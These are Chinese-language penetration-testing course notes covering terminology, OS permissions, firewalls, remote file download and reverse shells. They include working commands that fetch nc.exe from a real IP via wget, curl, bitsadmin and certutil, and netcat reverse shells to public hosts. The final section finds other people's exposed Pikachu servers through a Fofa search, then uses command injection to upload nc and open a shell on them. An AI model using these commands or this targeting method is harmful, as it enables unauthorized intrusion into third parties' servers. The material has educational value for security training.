![1645067918292-9404ec3d-375b-4e79-a66b-3494796b424b.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649637996373130.png)

```
基础知识
#知识点：
1、名词解释-渗透测试-漏洞&攻击&后门&代码&专业词

2、必备技能-操作系统-用途&命令&权限&用户&防火墙

3、必备技能-文件下载-缘由&场景&使用-提权&后渗透

4、必备技能-反弹命令-缘由&场景&使用-提权&后渗透

前后端，POC（验证）/EXP（利用），Payload（以什么权限给到你）/Shellcode（漏洞利用代码），后门（系统等统称）/Webshell（特指网站），木马（控制电脑，操作）/病毒（完全破坏性程序），反弹（权限移交），回显，跳板，黑白盒测试，暴力破解，社会工程学（个人的个性），撞库，ATT&CK(attack.mitre.org)等

参考：
https://www.cnblogs.com/sunny11/p/13583083.html  //专有名词介绍
https://forum.ywhack.com/bountytips.php?download //下载命令
https://forum.ywhack.com/reverse-shell/   //反弹shell生成 
https://blog.csdn.net/weixin_43303273/article/details/83029138  //常用命令
```

- #### 基础案例1：操作系统-用途&命令&权限&用户&防火墙

```plain
1、个人计算机&服务器用机 区别操作服务和个人用机，用途
2、Windows&Linux常见命令 了解，以后知道怎么查和用就可以，https://blog.csdn.net/weixin_43303273/article/details/83029138
3、文件权限&服务权限&用户权限等 提权技术 默认拒绝权限比允许权限高 
4、系统用户&用户组&服务用户等分类
5、自带防火墙出站&入站规则策略协议（ACL）waf应用防火墙针对web 
权限满足不了目的，这时候就需要提权。Windows是最高权限是system，Linux是root
administrator删不了c:/system32,但是system用户是可以删除的

权限问题：用户权限，服务权限，文件权限。
文件权限：创建一个文件，右键属性，可以查看用户的权限，也可以进行修改。
```

![1645068072903-c9999fe6-1a01-47c9-8ddf-e5a203d82519.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638064272274.png)

```plain
设置拒绝后，
```

![1645068103821-b06bcdbc-195f-4202-9fe5-52cfdd694807.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638118864721.png)

```plain
也会收到组里的权限影响。

低权限用户能做的事情是有限的，不足以完成需要完成的目的，这时候就需要用到提权。看用户和组的权限。
Windows权限：
system	最高权限	能够删除c:/system
administrator	管理员权限（自己定义）	不能删除c:/system
User	一般用户权限	有一些不能查看文件
Linux权限：
root	最高权限
其他用户	一般权限
防护墙：默认防火墙配置是允许网站协议通信，所以在测试的时候感觉开没开都没关系。但是内网渗透测试的时候，就会对协议有影响。
Windows自带防火墙defender，Linux自带iptable。也可以装第三方防火墙。
还有专门针对web防火墙waf，系统自带针对没有针对web的。
```

![1645068171770-2f793045-2316-415b-8746-65232fb76090.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638151670572.png)

- #### 实用案例1：文件上传下载-解决无图形化&解决数据传输

```plain
https://forum.ywhack.com/bountytips.php?download   下载命令，反弹shell命令，可以直接生成命令执行。
一般拿到权限只有cmd这个命令行，不能复制下载等，这时候就需要下载命令
直接访问www.xiaodi8.com/nc.exe 就可以直接下载
Linux：wget curl python ruby perl java等
Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等
Linux - wget:wget http://47.100.167.248:8081/nc.exe -O exploit.exe
Linux - curl:curl http://47.100.167.248:8081/nc.exe -o exploit.exe
Windows-Bitsadmin:bitsadmin /rawreturn /transfer down "http://47.100.167.248:8081/nc.exe" c:\\exploit.exe
下载的时候也要看是否有权限执行，如果没有执行权限，那下载也不会成功

把NC.exe上传至根目录。在kali中执行wget http://47.100.167.248:8081/NC.exe -O exploit.exe，就可以下载文件。
```

![1645068238220-44004c5b-6635-49b1-93fb-b8c80e4514f0.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638193130003.png)

```plain
cmd执行：
certutil.exe -urlcache -split -f http://47.100.167.248:8081/NC.exe exploit.exe
```

![1645068268918-68b264fa-5a71-4f2a-a429-94cf6b63283e.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638222142502.png)

```plain
不过被火绒查杀了。
cmd执行和powershell执行相同道理，都可以进行文件下载执行
```

- #### 实用案例2：反弹Shell命令-解决数据回显&解决数据通讯

```plain
• 执行命令的时候，会有数据的回显，告诉自己这个命令是不是执行成功，有没有文件，但是在大部分的测试环境是没有回显的。
useradd 用户名 passwd 用户名
测试Linux系统添加用户或修改密码命令交互回显问题
有些工具是不支持回显或者交互式，则这个时候需要反弹shell进行实现交互式和回显
交互式：比如执行passwd xioadi
```

**交互式**

![1645068345360-4063c346-3605-4ee5-a06d-d2489971e9b5.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638248501910-16941433983058.png)

##### 回显式



![1645068345369-20b31170-30d9-4065-a6e9-6f2cc97118b9.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638277219151.png)

- #### 结合案例1：防火墙绕过-正向连接&反向连接&内网服务器

```plain
1、内网：
内网 -> xiaodi8 //内网给shell（nc -e cmd 192.168.192.132 5577），xiaodi8监听(nc -lvvp 5577)
xiaodi8 !-> 内网
2、防火墙：
xiaodi8 <-> aliyun aliyun(nact www.xiaodi8.com 5566 -e /bin/bash) xiaodi8(nc -lvvp 5566)
xiaodi8防火墙 -> aliyun xiaodi8可以连接aliyun，aliyun不可以连接xiaodi8
aliyun !-> xiaodi8防火墙
防火墙入站严格，出站宽松

内网-->167.248
192.168.199.135连接192.168.199.130
199.135用nc执行nc-e-cmd -192.168.199.130 5577
199.130执行nc -lvvp 5577      服务器接受不了反弹shell  解决：宝塔端口问题
```

![1645068411709-bcb4d43b-bfe3-440d-9d85-b701483813e7.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638301207311.png)

```plain
167-->内网完成不了 这个解决只能在路由器完成，进行端口映射。
防火墙：
开了防火墙的一方，能主动出去，但不能被动连接
没开防火墙：135监听 136发送 可以执行。双向都是可以的
135开启防火墙：
135	发送	 136
136	不能发送	 135
完成防火墙测试。
```

- #### 结合案例2：学会了有手就行-Fofa拿下同行Pikachu服务器

```plain
文件下载&反弹Shell:前面要带上 127.0.0.1&
certutil -urlcache -split -f http://47.100.167.248/NC.exe nc.exe
nc -e cmd 47.75.212.155 5566
语法："pikachu"&&country="CN"&&title=="Get the pikachu"
用命令把nc上传到对方服务器，然后在代码执行反弹cmd命令
```

![1645068460272-6fb9e1f6-d701-4c4e-892c-4d60124994d6.png](%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&amp;%E5%90%8D%E8%AF%8D&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E5%8F%8D%E5%BC%B9SHELL&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87.assets/202204111649638402492058.png)

```plain
但是我很多执行后，没有回显结果。
```